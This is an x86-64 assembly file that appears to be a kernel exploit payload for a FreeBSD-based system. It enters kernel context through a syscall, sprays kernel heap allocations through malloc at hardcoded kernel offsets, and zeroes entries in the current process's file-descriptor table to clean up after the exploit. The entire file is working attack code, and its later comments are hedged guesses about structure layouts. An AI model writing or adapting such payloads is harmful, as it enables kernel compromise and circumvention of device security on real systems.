use64 ; Specify that the assembly code is 64-bit...

entry:
  push rsi
  push rdi
  mov rsi, rsp
  lea rdi, [rel kernel_entry]
  mov eax, 11
  syscall
  pop rdi
  pop rsi
  ret
kernel_entry:
  mov rsi, [rsi+8]
  push qword [rsi] ; socket closeup
  push qword [rsi+8] ; kernel base
  mov rcx, 1024
.malloc_loop:
  push rcx
  mov rax, [rsp+8] ; kernel base
  mov edi, 0xf8 ; sz
  lea rsi, [rax+0x1540eb0] ; M_TEMP
  mov edx, 2
  add rax, 0xd7a0 ; malloc
  call rax
  pop rcx
  loop .malloc_loop
  pop rdi
  pop rsi
  test rsi, rsi
  jz .skip_closeup
  mov rax, [gs:0]     ; thread    - The GS segment register is often used to access the thread-specific data, so this instruction is likely fetching a pointer to the current thread's data structure.
  mov rax, [rax+8]    ; td_proc   - Assuming the thread data structure, this instruction appears to access the associated process structure pointer, which is usually stored at an offset within the thread structure.
  mov rax, [rax+0x48] ; p_fd      - This instruction is likely fetching a pointer to the process's file descriptor table (struct filedesc* p_fd), and 0x48 is the offset within the process structure where this pointer is typically found.
  mov rdx, [rax]      ; fd_ofiles - It seems like this instruction is accessing the `fd_ofiles` field within the file descriptor table, which is often a pointer to an array of pointers to open file structures (struct file** fd_ofiles).
  mov rcx, 512
.closeup_loop:
  lodsd
  mov qword [rdx+8*rax], 0
  loop .closeup_loop
.skip_closeup:
  xor eax, eax
  ret
align 8
